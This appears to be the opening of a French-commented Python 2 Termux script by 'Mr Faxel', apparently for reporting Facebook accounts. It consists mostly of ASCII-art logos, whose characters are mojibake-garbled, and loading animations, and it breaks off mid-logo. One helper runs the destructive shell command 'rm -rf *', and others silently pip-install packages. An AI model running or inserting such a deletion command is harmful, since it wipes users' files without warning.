#!/usr/bin/python2
#coding=utf-8
#cd /data/data/com.termux/files/usr/bin/.session
################################# Credits ##########################################################
# Le credit pour ce code va a Mr Faxel
# Si vous voulez prendre Le credit pour ce code Voyez Faster Axel.
####################################################################################################
# -Importation des modules-#
import os,time,sys,fileinput,base64,datetime,random,requests,mechanize, marshal, __builtin__ as pp,zlib
import hashlib,re,threading,json,urllib,cookielib
import marshal as mc
from base64 import *
from getpass import getpass
from sys import stdout
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
from time import sleep   
from urllib2 import *
from platform import system
import subprocess as sp, sys, os, marshal, re, time, json, bs4, random, requests,py_compile,binascii,tqdm
try:
    from uncompyle6.main import decompile
except Exception as e:
    sp.call('pip2 install uncompyle2', shell=True, stderr=sp.STDOUT)	
####################################################################################################
## -Chargement du naviguateur- ##
reload(sys)
sys.setdefaultencoding('utf8')
naviguateur = mechanize.Browser()
naviguateur.set_handle_robots(False)
naviguateur.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
naviguateur.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
####################################################################################################
# -Automatisation-#
def mael(f):
    for l in f + '\n':
        sys.stdout.write(l)
        sys.stdout.flush()
        time.sleep(0.009)
####################################################################################################        
# -Effacer le systeme en question-#
def cls():
    os.system('clear')
####################################################################################################        
# -La date du jours courant-#
def horaire():
    os.system('date | lolcat')
    #print("\t\033[38;5;214m \033[1;31m  [\033[1;37m++\033[1;31m]\033[042m \033[1;37m Cod√© par\033[1;31m : \033[38;5;245m Mr \033[38;5;247mFaxel\033[1;31m [\033[1;37m++\033[1;31m] \033[00m")		
####################################################################################################
# -Animation a ma deuxieme methode-#
t = 0.15
def anime(f):
    for g in f:
        sys.stdout.write(g)
        sys.stdout.flush()
        time.sleep(t)
####################################################################################################
# -Animation a ma troisieme methode-#
def periode():
   periodique = ['.','..','...','....','.....']
   for o in periodique:
     print("\r\033[1;91m[‚óè] \033[1;92mChargement en cours\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)		
####################################################################################################	
########## -Au revoir- ##########
def bye():
     sys.exit()     
####################################################################################################	
########## -Arret animer- ##########
def arret():
    mael("\033[1;97m‚ïî‚ïê‚ïê‚ïó‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïî‚ïó‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïî‚ïê‚ïó")
    mael("\033[1;97m‚ïë‚ïî‚ïó‚ï†‚ï¶‚ï¶‚ï¶‚ï¶‚ïê‚ï£‚ïö‚ïó‚ïî‚ïê‚ï¶‚ïê‚ï¶‚ïó‚ïî‚ïê‚ï¶‚ïê‚ï¶‚ï¶‚ï¶‚ï¶‚ï£‚ïê‚ï£")
    mael("\033[1;91m‚ïë‚ï†‚ï£‚ïë‚ïî‚ï£‚ïî‚ï£‚ï©‚ï£‚ïî‚ï£‚ïë‚ï©‚ï£‚ïë‚ïë‚ïë‚ïë‚ïê‚ï£‚ï¨‚ïë‚ïë‚ïë‚ïî‚ï¨‚ïê‚ïë")
    mael("\033[1;91m‚ïö‚ïù‚ïö‚ï©‚ïù‚ïö‚ïù‚ïö‚ïê‚ï©‚ïê‚ïù‚ïö‚ïê‚ï©‚ï©‚ïê‚ïù‚ïö‚ïê‚ï©‚ïê‚ï©‚ïê‚ï©‚ïù‚ïö‚ïê‚ïù")
    mael('\033[1;97m‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí')
    print("\033[1;32m0%")
    mael('\033[1;97m‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí')
    print("\033[1;32m10%")
    mael('\033[1;97m‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí‚ñí')
    print("\033[1;32m30%")
    mael('\033[1;97m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñí‚ñí')
    print("\033[1;32m50%")
    mael('\033[1;97m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí')
    print("\033[1;32m80%")
    mael('\033[1;97m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà')
    print("\033[1;32m100%")
    mael("\n\033[1;97mBye Mec, j\'espere que tu as ador√©e le script de\033[1;91m Mr \033[1;96mFaxel\033[1;97m.A bientot!!\n")
    bye()
####################################################################################################
#Dev: Faxel
####################################################################################################
# -Chargement a ma deuxieme methode-#
def load(mot):
    chaine = [
     '/', '-', '|']
    for i in range(5):
        for x in range(len(chaine)):
            sys.stdout.write(('\r{}{}').format(str(mot), chaine[x]))
            time.sleep(0.3)
            sys.stdout.flush()
####################################################################################################        
# -Module uncompyle6-#
def pip_m():
    os.system('pip2 install uncompyle6')
    os.system('pip2 install pyconcrete')
####################################################################################################
# -Permet de supprimer tous les sous-script du script en question-#
def clean_remove():
    os.system('rm -rf *')
####################################################################################################
# -Afiichage auto sur le systeme en question-#
def figlet():
    os.system("figlet 'Faxel'")
    os.system("figlet 'Signaler un compte Facebook'")
####################################################################################################  
# -Chargement a ma premiere methode-#
def charge():
    compteur = ["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21","22","23","24","25","26","27","28","29","30","31","32","33","34","35","36","37","38","39","40","41","42","43","44","45","46","47","48","49","50","51","52","53","54","55","56","57","58","59","60","61","62","63","64","65","66","67","68","69","70","71","72","73","74","75","76","77","78","79","80","81","82","83","84","85","86","87","88","89","90","91","92","93","94","95","96","97","98","99","100"]
    print
    for b in compteur:
    	sys.stdout.write("\r\033[1;91m[\033[1;93m*\033[1;91m] \033[38;5;245m@\033[38;5;221mFaxel\033[1;92m "+b+" \033[1;97m%")
    	sys.stdout.flush()
    	time.sleep(0.1)
    time.sleep(1.5)
####################################################################################################	
def hacker():
    faxel_h = [
     '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*\n']
    for o in faxel_h:
        print '\r\x1b[1;97m[\x1b[1;32m‚óè‚óè\x1b[1;97m] \x1b[1;92mChargement en cours [38;5;221m  ' + o,
        sys.stdout.flush()
        time.sleep(0.15)
####################################################################################################
def McTony():
    mr = [
     '*Faxel*', '      ', '*McTony*', '      ', '*Faxel*', '      ', '*McTony*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*McTony*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*McTony*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*McTony*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*McTony*', '      ', '*Faxel*', '      ', '*Faxel*', '      ', '*McTony*\n']
    for o in mr:
        print '\r\x1b[1;97m[\x1b[1;32m‚óè‚óè\x1b[1;97m]   [38;5;221m  ' + o,
        sys.stdout.flush()
        time.sleep(0.15)
####################################################################################################
####################################################################################################
############################################# -MES LOGOS- ##########################################
logo =("""\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨\033[1;32m‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè            \n\033[38;5;214m‚Ä¢_  _ ____ \033[1;97m _  _ ____ ____ _  _\033[1;32m ____ ____   _  _‚Ä¢ \n\033[38;5;214m‚Ä¢|\/| |__/ \033[1;97m |__| |__| |    |_/ \033[1;32m |___ |__/   |_/ ‚Ä¢ \n\033[38;5;214m‚Ä¢|  | |  \ \033[1;97m |  | |  | |___ | \_\033[1;32m |___ |  \ __| \_‚Ä¢    \n\033[38;5;214m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë\033[1;97m‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè‚óè‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨\033[1;32m‚ñ¨‚ñ¨‚ñ¨‚ñ¨‡πë€©€©‡πë‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚ñ¨‚óè\n\033[1;97m‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó\n\033[1;97m‚ïë\033[1;91m[\033[1;93m**\033[1;91m]\033[38;5;95m      Developpeur \033[1;97m:\033[38;5;214m  Faxel           \033[1;91m[\033[1;93m**\033[1;91m]\033[1;97m‚ïë\n\033[1;97m‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù""")
logo1 =("""\033[1;92m\n\033[1;92m-----üÑºüÖÅ------\ /------üÑµüÑ∞üÖáüÑ¥üÑª-----\ /-----3b------\ /------------\\n\033[1;96m1_1_1_1 1_1_1_1 1_1_1_1 1_0_0_0 0_0_1_1 1_0_1_1 0_0_0_1 1_1_0_00_1\n\033[1;96m1 1 1 1 1 1 1 1 1 1 1 1 1 0                                     \n\033[1;96m                            0                                   \n\033[1;96m                              0                                 \n\033[1;96m                                0 0 1 1                         \n\033[1;96m                                        1 0 1 1                 \n\033[1;96m                                                0 0 0 1         \n\033[1;96m                                                        1 1 0 1   \n\033[1;96m                                                               0 \033[48;5;0;38;5;197müÑºüÖÅ\033[38;5;128m üÑµüÑ∞üÖáüÑ¥üÑª""")
logo2 =("""\033[48;5;0;38;5;195m‚ïî‚ïê‚ïê‚ïê‚ïó‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïî‚ïó\n\033[48;5;0;38;5;195m‚ïë‚ïî‚ïê‚ïê‚ïù‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïë‚ïë\n\033[48;5;0;38;5;195m‚ïë‚ïö‚ïê‚ïê‚ï¶‚ïê‚ïê‚ï¶‚ïó‚ïî‚ï¶‚ïê‚ïê‚ï£‚ïë\n\033[38;5;136m‚ïë‚ïî‚ïê‚ïê‚ï£‚ïî‚ïó‚ï†‚ï¨‚ï¨‚ï£‚ïë‚ïê‚ï£‚ïë\n\033[38;5;136m‚ïë‚ïë‚îÄ‚îÄ‚ïë‚ïî‚ïó‚ï†‚ï¨‚ï¨‚ï£‚ïë‚ïê‚ï£‚ïö‚ïó\n\033[38;5;136m‚ïö‚ïù‚îÄ‚îÄ‚ïö‚ïù‚ïö‚ï©‚ïù‚ïö‚ï©‚ïê‚ïê‚ï©‚ïê‚ïù\033[38;5;112m üÑºüÖÅ \033[38;5;112müÑµüÑ∞üÖáüÑ¥üÑª""")
logo3 =("""\033[48;5;0;38;5;195m\n‚ï≠‚îÅ‚îÅ‚îÅ‚ïÆ‚ï±‚ï±‚ï±‚ï±‚ï±‚ï±‚ï±‚ï±‚ï±‚ï±‚ï±‚ï≠‚ïÆ\n‚îÉ‚ï≠‚îÅ‚ïÆ‚îÉ‚ï±‚ï±‚ï±‚ï±‚ï±‚ï±‚ï±‚ï±‚ï±‚ï±‚ï≠‚ïØ‚ï∞‚ïÆ\n‚îÉ‚ï∞‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚î≥‚îÅ‚îÅ‚î≥‚ïÆ‚ï≠‚î≥‚îÅ‚ïã‚ïÆ‚ï≠‚ïã‚îÅ‚îÅ‚ïÆ\n‚ï∞‚îÅ‚îÅ‚ïÆ‚îÉ‚îÉ‚îÅ‚î´‚ï≠‚îÅ‚î´‚îÉ‚îÉ‚îÉ‚ï≠‚ïã‚î´‚îÉ‚îÉ‚îÉ‚îÅ‚î´\n‚îÉ‚ï∞‚îÅ‚ïØ‚îÉ‚îÉ‚îÅ‚î´‚ï∞‚îÅ‚î´‚ï∞‚ïØ‚îÉ‚îÉ‚îÉ‚îÉ‚ï∞‚î´‚îÉ‚îÅ‚î´\n‚ï∞‚îÅ‚îÅ‚îÅ‚îª‚îÅ‚îÅ‚îª‚îÅ‚îÅ‚îª‚îÅ‚îÅ‚îª‚ïØ‚ï∞‚îª‚îÅ‚îª‚îÅ‚îÅ‚ïØ """)
logo4 =("""\033[48;5;0;38;5;197m‚ñà‚ñÄ‚ñÄ‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñë‚ñë‚ÄÉ‚ñà‚ñÄ‚ñÄ‚ÄÉ \033[38;5;136m‚ñà‚ñÄ‚ñÄ‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ÄÉ‚ñà‚ñÑ‚ñà\n\033[48;5;0;38;5;197m‚ñà‚ñÑ‚ñÑ‚ÄÉ‚ñà‚ñÑ‚ñà‚ÄÉ‚ñà‚ñë‚ñÄ‚ñë‚ñà‚ÄÉ‚ñà‚ñÄ‚ñÄ‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñÑ‚ñÑ‚ÄÉ‚ñà‚ñà‚ñÑ‚ÄÉ \033[38;5;136m‚ñà‚ñÑ‚ñÑ‚ÄÉ‚ñà‚ñÄ‚ñÑ‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñÑ‚ñà‚ÄÉ‚ñë‚ñà‚ñë""")
logo5 =("""\033[38;5;115m‚ïî‚ïê‚ïê‚ïê‚ïó‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\033[38;5;112m‚ïî‚ïê‚ïê‚ïê‚ïó\n\033[38;5;115m‚ïë‚ïî‚ïê‚ïê‚ïù‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\033[38;5;112m‚ïë‚ïî‚ïê‚ïó‚ïë\n\033[38;5;115m‚ïë‚ïö‚ïê‚ïê‚ï¶‚ïê‚ï¶‚ïê‚ï¶‚ïê‚ïê‚ï¶‚ïê‚ïó\033[38;5;112m‚ïë‚ïë‚îÄ‚ïö‚ï¨‚ïê‚ï¶‚ïê‚ïê‚ï¶‚ïê‚ïê‚ï¶‚ïó‚îÄ‚ïî‚ïó\n\033[38;5;115m‚ïë‚ïî‚ïê‚ïê‚ï£‚ïî‚ï£‚ïî‚ï£‚ïî‚ïó‚ïë‚ïî‚ïù\033[38;5;112m‚ïë‚ïë‚îÄ‚ïî‚ï£‚ïî‚ï£‚ïî‚ïó‚ïë‚ïê‚ïê‚ï£‚ïë‚îÄ‚ïë‚ïë\n\033[38;5;115m‚ïë‚ïö‚ïê‚ïê‚ï£‚ïë‚ïë‚ïë‚ïë‚ïö‚ïù‚ïë‚ïë‚îÄ\033[38;5;112m‚ïë‚ïö‚ïê‚ïù‚ïë‚ïë‚ïë‚ïî‚ïó‚ï†‚ïê‚ïê‚ïë‚ïö‚ïê‚ïù‚ïë\n\033[38;5;115m‚ïö‚ïê‚ïê‚ïê‚ï©‚ïù‚ïö‚ïù‚ïö‚ïê‚ïê‚ï©‚ïù‚îÄ\033[38;5;112m‚ïö‚ïê‚ïê‚ïê‚ï©‚ïù‚ïö‚ïù‚ïö‚ï©‚ïê‚ïê‚ï©‚ïê‚ïó‚ïî‚ïù\n\033[38;5;115m‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\033[38;5;112m‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïî‚ïê‚ïù‚ïë\n\033[38;5;115m‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\033[38;5;112m‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïö‚ïê‚ïê‚ïù""")
logo6 =("""\033[48;5;0;38;5;192m‚ñà‚ñë‚ñà‚ÄÉ‚ñà‚ñÄ‚ñÄ‚ÄÉ‚ñÄ‚ñÑ‚ñÄ‚ÄÉ \033[38;5;121m‚ñë‚ñë‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñÑ‚ñë‚ñà\n\033[48;5;0;38;5;192m‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ñà‚ñÑ‚ÄÉ‚ñà‚ñë‚ñà‚ÄÉ \033[38;5;121m‚ñà‚ñÑ‚ñà‚ÄÉ‚ñà‚ñÑ‚ñà‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñë‚ñÄ‚ñà""")
logo7 =("""\033[38;5;121m‚ñÄ‚ñà‚ÄÉ‚ñà‚ñë‚ñë‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñÑ‚ñÑ‚ÄÉ\033[48;5;0;38;5;192m‚ñà‚ñÄ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ÄÉ\033[48;5;0;38;5;195m‚ñà‚ñÑ‚ñÑ‚ÄÉ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ÄÉ‚ñà‚ñÄ‚ñÄ\n\033[38;5;121m‚ñà‚ñÑ‚ÄÉ‚ñà‚ñÑ‚ñÑ‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñÑ‚ñà‚ÄÉ\033[48;5;0;38;5;192m‚ñà‚ñë‚ñÄ‚ñë‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñÑ‚ÄÉ‚ñÑ‚ñà‚ÄÉ\033[48;5;0;38;5;195m‚ñà‚ñÑ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñÑ‚ñà‚ÄÉ‚ñà‚ñà‚ñÑ""")
logo8 =("""\033[38;5;111m‚ñà‚ñÄ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ÄÉ ‚ÄÉ\033[38;5;124m‚ñà‚ñÑ‚ñÑ‚ÄÉ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ÄÉ‚ñà‚ñë‚ñà\n\033[38;5;111m‚ñà‚ñë‚ñÄ‚ñë‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñÑ‚ÄÉ‚ñÑ‚ñà‚ÄÉ ‚ÄÉ\033[38;5;124m‚ñà‚ñÑ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñÑ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà""")
logo9 =(""" \033[38;5;124m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ïó‚ñë‚ñë‚ñë‚ñà‚ñà‚ïó‚ñë‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñë\n\033[38;5;124m‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë\n\033[38;5;124m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ï¶‚ïù‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ñà‚ñà‚ïó‚ñë\n\033[38;5;124m‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ñë‚ñë‚ñë‚ñà‚ñà‚ïë‚ñà‚ñà‚ïë‚ñë‚ñë‚ïö‚ñà‚ñà‚ïó\n\033[38;5;124m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ï¶‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ïö‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù\n\033[38;5;124m‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë‚ñë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù‚ñë""")
logo10 =("""\033[38;5;121m‚ñà‚ñÄ‚ñÄ‚ÄÉ‚ñà‚ñÄ‚ñÄ‚ÄÉ‚ñà‚ñë‚ñë‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñÄ‚ÄÉ‚ñà‚ÄÉ‚ñÄ‚ñà‚ñÄ‚ÄÉ‚ñÑ‚ñÄ‚ñà‚ÄÉ‚ñÄ‚ñà‚ñÄ‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñà‚ñÑ‚ñë‚ñà\n\033[38;5;121m‚ñà‚ñÄ‚ñë‚ÄÉ‚ñà‚ñà‚ñÑ‚ÄÉ‚ñà‚ñÑ‚ñÑ‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñÑ‚ñÑ‚ÄÉ‚ñà‚ÄÉ‚ñë‚ñà‚ñë‚ÄÉ‚ñà‚ñÄ‚ñà‚ÄÉ‚ñë‚ñà‚ñë‚ÄÉ‚ñà‚ÄÉ‚ñà‚ñÑ‚ñà‚ÄÉ‚ñà‚ñë‚ñÄ‚ñà""")
logo_robot_force_pas =("""\033[38;5;214m	  ‚ñá‚ñá‚ñá‚ñá‚ñá\033[1;97m Je force pas!!\033[1;92m ‚ñá‚ñá‚ñá‚ñá‚ñá\n[38;5;214m\n                 ‚äÇ„ÉΩ\n               „ÄÄ ÔººÔºº  ŒõÔºøŒõ\n              „ÄÄ„ÄÄ Ôºº(  ÀòœâÀò  )\n                „ÄÄ„ÄÄ„ÄÄ >„ÄÄ‚åí„ÉΩ\n                 „ÄÄ„ÄÄ„ÄÄ/ „ÄÄ „Å∏Ôºº\n                 „ÄÄ„ÄÄ /„ÄÄ„ÄÄ/„ÄÄÔººÔºº  \033[1;97m\n                 „ÄÄ„ÄÄ Ôæö„ÄÄ„Éé„ÄÄ„ÄÄ „ÉΩ_„Å§\n                 „ÄÄ„ÄÄ/„ÄÄ/\n                 „ÄÄ /„ÄÄ/|\n                  „ÄÄ(„ÄÄ(„ÉΩ\n                  „ÄÄ|„ÄÄ|„ÄÅÔºº  \033[1;92m\n                  „ÄÄ| ‰∏ø Ôºº ‚åí)\n                  „ÄÄ| |„ÄÄ„ÄÄ) /\n                   „Éé )    LÔæâ\n                  (_Ôºè  \033[1;97mProgressez chaque jour avec audace vers vos r√™ves,\nrefusez les coups d\‚Äôarr√™t et rien ne pourra vous arr√™ter!!!\n			\033[1;93m---------\033[1;95m L\'AVENIR\033[1;97m C'EST MAINTENANT \033[1;93m---------\n[38;5;214m	 ‚ñá‚ñá‚ñá‚ñá‚ñá\033[1;97m Je force pas!!\033[1;92m ‚ñá‚ñá‚ñá‚ñá‚ñá""")
mpdl =("""\033[38;5;214m‚ïî‚ïê‚ï¶‚ïê‚ï¶‚ïê‚ïê‚ï¶‚ïê‚ïó\033[1;97m‚ïî‚ïê‚ïó‚îÄ‚îÄ‚ïî‚ï¶‚ïó‚îÄ\033[1;92m‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ\033[1;96m‚ïî‚ïê‚ïó‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïî‚ïê‚ïó\n\033[38;5;214m‚ïë‚ïë‚ïë‚ïë‚ï†‚ïó‚ïó‚ïë‚ï¨‚ïë\033[1;97m‚ïë‚ïê‚ï¨‚ïê‚ïó‚ï†‚ï£‚ïö‚ïó\033[1;92m‚ïî‚ïê‚ï¶‚ïê‚ï¶‚ïê‚ï¶‚ïê‚ï¶‚ïê‚ïó\033[1;96m‚ïë‚ïê‚ï¨‚ï¶‚ï¶‚ïê‚ï¶‚ïê‚ï¶‚ïê‚ï£‚ïê‚ï£\n\033[38;5;214m‚ïë‚ïë‚ïë‚ïë‚ï†‚ï©‚ïù‚ïë‚ïî‚ïù\033[1;97m‚ïë‚ïî‚ï£‚ï¨‚ïö‚ï£‚ïë‚ïî‚ï£\033[1;92m‚ïë‚ï¨‚ïö‚ïó‚ïë‚ïî‚ï£‚ï©‚ï£‚ïê‚ï£\033[1;96m‚ï†‚ïê‚ïë‚ïë‚ïë‚ïê‚ï£‚ïê‚ï£‚ï©‚ï¨‚ïê‚ïë\n\033[38;5;214m‚ïö‚ï©‚ïê‚ï©‚ï©‚ïê‚ïê‚ï©‚ïù‚îÄ\033[1;97m‚ïö‚ïù‚ïö‚ïê‚ïê‚ï©‚ï©‚ïê‚ïù\033[1;92m‚ïö‚ïê‚ïê‚ï©‚ïê‚ïù‚ïö‚ïê‚ï©‚ïê‚ïù\033[1;96m‚ïö‚ïê‚ï©‚ïê‚ï©‚ïê‚ï©‚ïê‚ï©‚ïê‚ï©‚ïê‚ïù""")
logo_term_key =("""\033[1;97m‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ñà‚ïó\033[1;97m      ‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ïó   ‚ñà‚ñà‚ïó\n\033[1;91m‚ïö‚ïê‚ïê‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ïë\033[1;94m      ‚ñà‚ñà‚ïë ‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ïê‚ïê‚ïê‚ïê‚ïù‚ïö‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïù\n\033[1;91m   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïî‚ñà‚ñà‚ñà‚ñà‚ïî‚ñà‚ñà‚ïë\033[1;97m‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó\033[1;94m‚ñà‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó   ‚ïö‚ñà‚ñà‚ñà‚ñà‚ïî‚ïù \n\033[1;91m   ‚ñà‚ñà‚ïë   ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù  ‚ñà‚ñà‚ïî‚ïê‚ïê‚ñà‚ñà‚ïó‚ñà‚ñà‚ïë‚ïö‚ñà‚ñà‚ïî‚ïù‚ñà‚ñà‚ïë‚ïö‚ïê‚ïê‚ïê‚ïê‚ïù\033[1;94m‚ñà‚ñà‚ïî‚ïê‚ñà‚ñà‚ïó ‚ñà‚ñà‚ïî‚ïê‚ïê‚ïù    ‚ïö‚ñà‚ñà‚ïî‚ïù  \n\033[1;91m   ‚ñà‚ñà‚ïë   